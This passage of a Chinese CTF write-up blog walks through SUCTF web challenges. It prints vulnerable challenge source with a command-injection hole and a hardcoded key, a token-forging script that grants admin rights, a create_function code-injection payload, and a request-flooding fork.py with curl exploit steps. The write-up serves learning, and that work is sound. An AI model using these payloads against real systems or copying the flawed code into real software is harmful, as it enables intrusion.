+<img src="/2018/11/14/CG-CTF-web篇零基础指南/robot.jpg">
+<p><code>suenc.so</code> 是一个加密扩展文件，可以下载下来，用来解密admin.php 。</p>
+<p>因为我很菜还不会逆向，所以直接贴网上师傅们解密出来的代码了</p>
+<p><strong>index.php</strong> </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if(!isset($_SESSION))</span><br><span class="line">    &#123;</span><br><span class="line">        session_start();</span><br><span class="line">    &#125;    </span><br><span class="line">    echo &apos;...这部分前端内容我就省略不贴了...&apos;;    </span><br><span class="line">    include_once(&apos;func.php&apos;);    </span><br><span class="line">    if(isset($_GET[&apos;username&apos;]))</span><br><span class="line">    &#123;</span><br><span class="line">        $username = $_GET[&apos;username&apos;];</span><br><span class="line">        $md5 = md5(get_identify().$username);</span><br><span class="line">        $admin = 0;</span><br><span class="line">        $token = encrypt($username.&apos;|&apos;.$admin.&apos;|&apos;.$md5);</span><br><span class="line">        $_SESSION[&apos;sign&apos;] = $md5;</span><br><span class="line">        $_SESSION[&apos;token&apos;] = $token;</span><br><span class="line">    &#125;</span><br><span class="line">    showImage();    if(isset($_GET[&apos;token&apos;]) &amp;&amp; isset($_GET[&apos;sign&apos;]))</span><br><span class="line">    &#123;</span><br><span class="line">        $token = $_GET[&apos;token&apos;];</span><br><span class="line">        $sign = $_GET[&apos;sign&apos;];        echo &apos;sign : &apos;.$sign.&apos;&lt;br&gt;&apos;;        echo &apos;token: &apos;.$token.&apos;&lt;br&gt;&apos;;</span><br><span class="line">        $info = explode(&apos;|&apos;, decrypt($token));        echo decrypt($token);</span><br><span class="line">        var_dump($info);        if(count($info) == 3)</span><br><span class="line">        &#123;            if(md5(get_identify().$info[0]) == $info[2])</span><br><span class="line">            &#123;</span><br><span class="line">                $sign = $info[1];</span><br><span class="line">                $admin = $info[1];</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $admin = $info[1];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;else&#123;        if(isset($_SESSION[&apos;token&apos;]) &amp;&amp; isset($_SESSION[&apos;sign&apos;]))</span><br><span class="line">        &#123;            echo &apos;sign : &apos;.$_SESSION[&apos;sign&apos;].&apos;&lt;br&gt;&apos;;            echo &apos;token: &apos;.$_SESSION[&apos;token&apos;].&apos;&lt;br&gt;&apos;;</span><br><span class="line">            $token = $_SESSION[&apos;token&apos;];</span><br><span class="line">            $sign = $_SESSION[&apos;sign&apos;];</span><br><span class="line">            $info = explode(&apos;|&apos;, decrypt($token));            if(count($info) == 3)</span><br><span class="line">            &#123;                if(md5(get_identify().$info[0]) == $info[2])</span><br><span class="line">                &#123;</span><br><span class="line">                    $sign = $info[1];</span><br><span class="line">                    $admin = $info[1];</span><br><span class="line">                    </span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    $admin = $info[1];</span><br><span class="line">                &#125;                echo &apos;&lt;br&gt;&apos;.$admin;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    if(isset($admin) &amp;&amp; $admin == 3)</span><br><span class="line">    &#123;</span><br><span class="line">        $_SESSION[&apos;auth&apos;] = &apos;admin&apos;;        echo &quot;&lt;a href=&apos;admin.php&apos;&gt;Admin&lt;/a&gt;&quot;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p><strong>func.php</strong> </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: meizj</span><br><span class="line"> * Date: 2018/2/2</span><br><span class="line"> * Time: 下午9:25</span><br><span class="line"> */include &quot;class.php&quot;;</span><br><span class="line">define(&quot;KEY&quot;,&quot;8690475385984657&quot;);</span><br><span class="line">define(&quot;method&quot;,&quot;aes-128-cfb&quot;);</span><br><span class="line">define(&quot;BS&quot;,16);</span><br><span class="line">define(&quot;IDENTIFY&quot;,&quot;9850375038&quot;);function get_token()&#123;</span><br><span class="line">    $token = &apos;&apos;;    for($i=0;$i&lt;16;$i++)&#123;</span><br><span class="line">        $token .= chr(rand(1,255));</span><br><span class="line">    &#125;    return $token;</span><br><span class="line">&#125;function enc($s)&#123;</span><br><span class="line">    $token = get_token();</span><br><span class="line">    $code1 = openssl_encrypt(string($s),method,key,OPENSSL_RAW_DATA,$token);</span><br><span class="line">    $code2 = base64_encode(base64_encode($token.&quot;-&quot;.$code1));    return $code2;</span><br><span class="line">&#125;function dec($s)&#123;    if($cc = base64_decode(base64_decode($s)))</span><br><span class="line">    &#123;        if($iv = substr($cc,0,16))</span><br><span class="line">        &#123;            if($d = substr($cc,17))</span><br><span class="line">            &#123;                if($s = openssl_decrypt($d, method, key, OPENSSL_RAW_DATA,$iv))</span><br><span class="line">                &#123;                    return $s;</span><br><span class="line">                &#125;                else</span><br><span class="line">                    die(&quot;error&quot;);</span><br><span class="line">            &#125;            else</span><br><span class="line">                return 0;</span><br><span class="line">        &#125;        else</span><br><span class="line">            return 0;</span><br><span class="line">    &#125;    else</span><br><span class="line">        return 0;</span><br><span class="line">&#125;function uploadImage()&#123;    if($_SESSION[&apos;auth&apos;] !== &quot;admin&quot;)&#123;        die(&quot;Auth Failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $AllowedType = array(        &quot;png&quot;,        &quot;gif&quot;,        &quot;jpg&quot;</span><br><span class="line">    );</span><br><span class="line">    $filename = $_FILES[&apos;file&apos;][&apos;name&apos;];</span><br><span class="line">    $filesize = $_FILES[&apos;file&apos;][&apos;size&apos;];    if($filesize &gt; 1000000)&#123;        exit(&quot;Too large&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $fileext = substr($filename, strrpos($filename, &apos;.&apos;)+1);    if(in_array($fileext,$AllowedType))&#123;</span><br><span class="line">        $file = &quot;thumbs/images/&quot;.md5(time().&quot;admin&quot;).&quot;.&quot;.$fileext;        if(file_exists($file))&#123;            exit(&quot;File existed already&quot;);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;],$file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;        exit(&quot;Not Allowed Ext&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;function viewImage($name)&#123;    if($_SESSION[&apos;auth&apos;] !== &quot;admin&quot;)&#123;        die(&quot;Auth Failed&quot;);</span><br><span class="line">    &#125;    new ImageView($name);</span><br><span class="line">&#125;function showImage()&#123;</span><br><span class="line">    $obj = new Home(&quot;thumbs/images/&quot;);</span><br><span class="line">    $obj-&gt;showImg();</span><br><span class="line"></span><br><span class="line">&#125;function to($str) &#123;    return $str . str_repeat(chr(BS - strlen($str) % BS), (BS - strlen($str) % BS));</span><br><span class="line">&#125;function re($str) &#123;    return substr($str, 0, -ord(substr($str, -1, 1)));</span><br><span class="line">&#125;function getkey()&#123;    return KEY;</span><br><span class="line">&#125;function get_identify()&#123;    return IDENTIFY;</span><br><span class="line">&#125;function encrypt($str)&#123;</span><br><span class="line">    $key = getkey();</span><br><span class="line">    srand(time() / 300);</span><br><span class="line">    $token = get_token();</span><br><span class="line">    $cipher = bin2hex(mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, to($str), MCRYPT_MODE_CFB, $token));    return base64_encode($cipher);</span><br><span class="line">&#125;function decrypt($str)&#123;</span><br><span class="line">    $decode = base64_decode($str);</span><br><span class="line">    $key = getkey();</span><br><span class="line">    srand(time() / 300);</span><br><span class="line">    $token = get_token();</span><br><span class="line">    $bin = hex2bin($str);</span><br><span class="line">    $plain = re(mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key,$bin , MCRYPT_MODE_CFB, $token));    return $plain;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>class.php</strong> </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: meizj</span><br><span class="line"> * Date: 2018/2/2</span><br><span class="line"> * Time: 下午11:00</span><br><span class="line"> */class ImageView&#123;    private $filename = &quot;&quot;;    function __construct($name)&#123;</span><br><span class="line">        $this-&gt;filename = &quot;images/$name&quot;;</span><br><span class="line">        $this-&gt;createThumbnail();</span><br><span class="line">    &#125;    function createThumbnail()&#123;</span><br><span class="line">        $e = stripcslashes(preg_replace(&apos;/[^0-9\\\]/&apos;,&apos;&apos;,isset($_GET[&apos;size&apos;])?$_GET[&apos;size&apos;]:25));</span><br><span class="line">        system(&quot;/usr/bin/convert &#123;$this-&gt;filename&#125; --resize $e ./thumbs/&#123;$this-&gt;filename&#125;&quot;);</span><br><span class="line">    &#125;    function __toString()</span><br><span class="line">    &#123;        // TODO: Implement __toString() method.</span><br><span class="line">        return &quot;&lt;a href=&#123;$this-&gt;filename&#125;&gt;</span><br><span class="line">                &lt;img src=./thumbs/&#123;$this-&gt;filename&#125;&gt;&lt;/a&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;class Home&#123;    private $dir = &quot;&quot;;    public function __construct($dir)&#123;</span><br><span class="line">        $this-&gt;dir = $dir;</span><br><span class="line">    &#125;    public function showImg()&#123;</span><br><span class="line">        $files = $this-&gt;getDirFile($this-&gt;dir);        foreach ($files as $file)&#123;            echo &quot;&lt;img src=$file&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    public function getDirFile($dir)&#123;</span><br><span class="line">        $files = array();        if(!is_dir($dir)) &#123;            return $files;</span><br><span class="line">        &#125;</span><br><span class="line">        $handle = opendir($dir);        if($handle) &#123;            while(false !== ($file = readdir($handle))) &#123;                if ($file != &apos;.&apos; &amp;&amp; $file != &apos;..&apos;) &#123;</span><br><span class="line">                    $filename = $dir . &quot;/&quot;  . $file;                    if(is_file($filename)) &#123;</span><br><span class="line">                        </span><br><span class="line">                            $files[] = $filename;</span><br><span class="line">                        </span><br><span class="line">                    &#125;else &#123;</span><br><span class="line">                        $files = array_merge($files, get_files($filename));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;   //  end while</span><br><span class="line">            closedir($handle);</span><br><span class="line">        &#125;        return $files;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>admin.php</strong> </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: meizj</span><br><span class="line"> * Date: 2018/2/2</span><br><span class="line"> * Time: 下午9:38</span><br><span class="line"> */session_start();if($_SESSION[&apos;auth&apos;]!==&quot;admin&quot;)&#123;    die(&quot;Auth Failed!&quot;);</span><br><span class="line">&#125;include &quot;func.php&quot;;if(isset($_GET[&apos;action&apos;]))&#123;</span><br><span class="line">    $action = $_GET[&apos;action&apos;];    if($action == &quot;uploadImage&quot;)&#123;        include_once &quot;template/upload.php&quot;;        if(isset($_FILES[&apos;file&apos;]))&#123;</span><br><span class="line">            uploadImage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;elseif ($action == &quot;viewImage&quot;)&#123;</span><br><span class="line">        $file = isset($_GET[&apos;file&apos;])?$_GET[&apos;file&apos;]:&quot;23.jpg&quot;;</span><br><span class="line">        viewImage($file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>先看<code>index.php</code>，这里会将<code>$token</code>解密，如果<code>$admin==3</code>就有权限访问<code>admin.php</code>，我们在本地生成加密 token </p>
+<p>token的加密脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">define(&quot;KEY&quot;,&quot;8690475385984657&quot;);</span><br><span class="line">define(&quot;method&quot;,&quot;aes-128-cfb&quot;);</span><br><span class="line">define(&quot;BS&quot;,16);</span><br><span class="line">define(&quot;IDENTIFY&quot;,&quot;9850375038&quot;);</span><br><span class="line"></span><br><span class="line">function getkey()&#123;</span><br><span class="line">    return KEY;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function get_identify()&#123;</span><br><span class="line">    return IDENTIFY;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function get_token()&#123;</span><br><span class="line">    $token = &apos;&apos;;</span><br><span class="line">    for($i=0;$i&lt;16;$i++)&#123;</span><br><span class="line">        $token .= chr(rand(1,255));</span><br><span class="line">    &#125;</span><br><span class="line">    return $token;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function to($str) &#123;</span><br><span class="line">    return $str . str_repeat(chr(BS - strlen($str) % BS), (BS - strlen($str) % BS));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function encrypt($str)&#123;</span><br><span class="line">    $key = getkey();</span><br><span class="line">    srand(time() / 300);</span><br><span class="line">    $token = get_token();</span><br><span class="line">    $cipher = bin2hex(mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, to($str), MCRYPT_MODE_CFB, $token));</span><br><span class="line">    return base64_encode($cipher);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = &apos;qwer&apos;;</span><br><span class="line">$md5 = md5(get_identify().$username);</span><br><span class="line">$admin = &apos;3&apos;;</span><br><span class="line">$token = encrypt($username . &apos;|&apos; . $admin . &apos;|&apos; . $md5);</span><br><span class="line">echo $md5;</span><br><span class="line">echo &quot;\n&quot;</span><br><span class="line">echo $token;</span><br><span class="line">echo &quot;\n&quot;;</span><br></pre></td></tr></table></figure>
+<p>这个指定admin为3，生成一个token</p>
+<p>windows 跟 linux 的随机数是有差异的 ，所以脚本要拉到linux环境中执行。</p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/linux.jpg">
+<p>拿到了sign和token，访问<a href="http://45.76.173.177:23333/?sign=30dd01f4a4aeb5598d20ce3084e120a5&amp;token=YmMxNWI3MzY5MmFjZTA0NzExMzQwMjBhMDNiNGFhODYyZWVjNDQ1ZWY5NjI4ZDQ5NWI3YWE4OGFhNmZkNTg2OWQ0ZTdmYjg4ZTVlMjQ4Mjg5N2JhNWY5NDJjM2FjYzI4" target="_blank" rel="noopener">http://45.76.173.177:23333/?sign=30dd01f4a4aeb5598d20ce3084e120a5&amp;token=YmMxNWI3MzY5MmFjZTA0NzExMzQwMjBhMDNiNGFhODYyZWVjNDQ1ZWY5NjI4ZDQ5NWI3YWE4OGFhNmZkNTg2OWQ0ZTdmYjg4ZTVlMjQ4Mjg5N2JhNWY5NDJjM2FjYzI4</a></p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/32.jpg">
+<p>拿到管理员权限后接着看<code>admin.php</code>，文件上传好像是因为没有目录权限，一直上传不上东西，就算了。<code>viewImage</code>调用了<code>ImageView</code>类，最终通过调用系统命令的方式修改图片大小，这里没有对<code>$filename</code>进行过滤，直接拼接到命令执行中，构造 payload 执行命令</p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/33.jpg">
+<p>接下来就是寻找flag之旅了，最后发现flag在/etc/目录下</p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/33.jpg">
+<p>获得flag！</p>
+<p>补充一下审计admin.php源码的过程：</p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/view1.jpg">
+<p>跟进viewImage 跟进ImageView </p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/view2.jpg">
+<p>这里可以命令执行 </p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/view3.jpg">
+<p>file的地方就可以传进去命令 </p>
+<h2 id="36-Anonymous"><a href="#36-Anonymous" class="headerlink" title="36. Anonymous"></a>36. Anonymous</h2><p>这道题学到了很有意思的知识！</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Anonymous 匿名的</span><br><span class="line">PHP是最好的语言，不是吗？</span><br><span class="line">// SUCTF 2018，出题人：梅子酒</span><br><span class="line">//题目地址 http://45.76.173.177:23334/</span><br></pre></td></tr></table></figure>
+<p>根据题目可能是考php匿名函数 </p>
+<p>先看代码 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$MY = create_function(&quot;&quot;,&quot;die(`cat flag.php`);&quot;);</span><br><span class="line">$hash = bin2hex(openssl_random_pseudo_bytes(32));</span><br><span class="line">eval(&quot;function SUCTF_$hash()&#123;&quot;</span><br><span class="line">    .&quot;global \$MY;&quot;</span><br><span class="line">    .&quot;\$MY();&quot;</span><br><span class="line">    .&quot;&#125;&quot;);</span><br><span class="line">if(isset($_GET[&apos;func_name&apos;]))&#123;</span><br><span class="line">    $_GET[&quot;func_name&quot;]();</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">show_source(__FILE__);</span><br></pre></td></tr></table></figure>
+<p>先学习一下匿名函数的创建create_function()：</p>
+<p><code>string create_function (string $args, string $cod)</code></p>
+<p>string $args：变量部分</p>
+<p>string $code：方法代码部分 </p>
+<p>一个官方提供的例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$newfunc = create_function(&apos;$a,$b&apos;, &apos;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);&apos;);</span><br><span class="line">echo &quot;New anonymous function: $newfunc&quot;;</span><br><span class="line">echo $newfunc(2, M_E);</span><br><span class="line">// outputs</span><br><span class="line">// New anonymous function: lambda_1</span><br><span class="line">// ln(2) + ln(2.718281828459) = 1.6931471805599</span><br><span class="line">// M_E 是 php 中常量 e 的表示形式</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>顺便学习一下利用create_function()进行代码注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=$_GET[&apos;id&apos;];</span><br><span class="line">$b=&apos;echo&apos;.$a.&quot;;&quot;;</span><br><span class="line">$f=create_function(&apos;$a&apos;,$b);  /* 参数 &apos;$a&apos; $b 函数体</span><br><span class="line">$f($a);</span><br><span class="line">?&gt;</span><br><span class="line">这个匿名函数相当于这样的创建函数过程:</span><br><span class="line"></span><br><span class="line">function niming($a)&#123;  </span><br><span class="line">       echo $id.&apos;is&apos;.$a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload:?id=1;&#125;phpinfo();/*</span><br><span class="line">可以看到phpinfo的信息；</span><br></pre></td></tr></table></figure>
+<p>回到这道题，了解一下本题代码中的几个函数</p>
+<p> bin2hex() 函数把 ASCII 字符的字符串转换为十六进制值。</p>
+<p>openssl_random_pseudo_bytes 函数根据参数来生成指定个数的随机字节。</p>
+<p>die() 函数输出一条消息，并退出当前脚本。 </p>
+<p>这道题用到的知识点是： 匿名函数的名字和apache的Pre-fork模式</p>
+<p>Apache的默认模式Pre-fork会随着请求数量的增加而启动若干新的进程 。</p>
+<p>create_function创建的是匿名函数，而匿名函数也是有名字的，名字是\x00lambda_%d，其中%d代表他是当前进程中的第几个匿名函数。%d会从1一直进行递增，表示这是当前进程中第几个匿名函数。因此如果开启一个新的php进程，那么这个匿名函数就是\x00lambda_1，所以思路就是通过向Pre-fork模式的apache服务器发送大量请求，致使apache开启新的进程来处理请求，那么传递<code>func_name=%00lambda_1</code>就可以执行函数了。</p>
+<p>经过了解以上知识，我写了一个超级简单无脑的python脚本跑了一下就跑出来了flag，就是一直传递<code>func_name=%00lambda_1</code>参数向服务器发起请求，然后直到服务器启动了新的进程这个请求就可以获取flag了。</p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/29.jpg">
+<p>把url改一下就可以了。这道题改编自HITCON2017的一道web题，只考察了后半部分的知识点，原题orange师傅给出的官方writeup中的poc如下：</p>
+<p>fork.py</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import socket</span><br><span class="line">import time</span><br><span class="line">from multiprocessing.dummy import Pool as ThreadPool</span><br><span class="line">try:</span><br><span class="line">    requests.packages.urllib3.disable_warnings()</span><br><span class="line">except:</span><br><span class="line">    pass</span><br><span class="line">def run(i):</span><br><span class="line">    while 1:</span><br><span class="line">        HOST = &apos;x.x.x.x&apos;</span><br><span class="line">        PORT = 80</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((HOST, PORT))</span><br><span class="line">        s.sendall(&apos;GET / HTTP/1.1\nHost:web.suctf.asuri.org:81\nConnection: Keep-Alive\n\n&apos;)</span><br><span class="line">        # s.close()</span><br><span class="line">        print &apos;ok&apos;</span><br><span class="line">        time.sleep(0.5)</span><br><span class="line">i = 8</span><br><span class="line">pool = ThreadPool( i )</span><br><span class="line">result = pool.map_async( run,range(i) ).get(0xffff)</span><br></pre></td></tr></table></figure>
+<p>我在本地也复现了一下</p>
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/30.jpg">
+<img src="/2018/11/14/CG-CTF-web篇零基础指南/31.jpg">
+<p>步骤如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">exp:</span><br><span class="line"># get a cookie</span><br><span class="line">$ curl &apos;http://host/&apos; --cookie-jar cookie</span><br><span class="line"></span><br><span class="line"># force apache to fork new process</span><br><span class="line">$ python fork.py</span><br><span class="line"></span><br><span class="line"># get flag</span><br><span class="line">$ curl -b cookie &quot;http://host:port/?func_name=%00lambda_1&quot;</span><br></pre></td></tr></table></figure>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>终于，经过三天做题两天整理，自己好像摸到了些ctf的门槛，虽然还很菜，关于ctf的下一步可能先去学学隐写术再来刷题。</p>
+<p>这些天来学到了很多以前没想过的姿势，也回顾了许多忘了差不多的常见漏洞绕过姿势。</p>
+<p>希望能给看这篇文章的你带去一些帮助，要是师傅们发现疏漏了还请快指正我！</p>
+<p>教室有些嘈杂，那些嘈杂此时入耳，仿佛成了我心中的白月光。</p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.jianshu.com/p/19999fa5ca8b" target="_blank" rel="noopener">南邮CTF-WEB-writeup</a></p>
+<p><a href="http://www.ckj123.com/?p=25" target="_blank" rel="noopener">SUCTF web题目 writeup</a></p>
+<p><a href="https://lorexxar.cn/2017/11/10/hitcon2017-writeup/" target="_blank" rel="noopener">HITCON2017-writeup整理</a></p>
+<p><a href="https://github.com/orangetw/My-CTF-Web-Challenges/tree/master/hitcon-ctf-2017/baby%5Eh-master-php-2017" target="_blank" rel="noopener">hitcon-ctf-2017 orange官方writeup</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/13/CG-CTF-综合题-2-writeup/" rel="next" title="CG-CTF 综合题(2) writeup">
+                <i class="fa fa-chevron-left"></i> CG-CTF 综合题(2) writeup
+              </a>
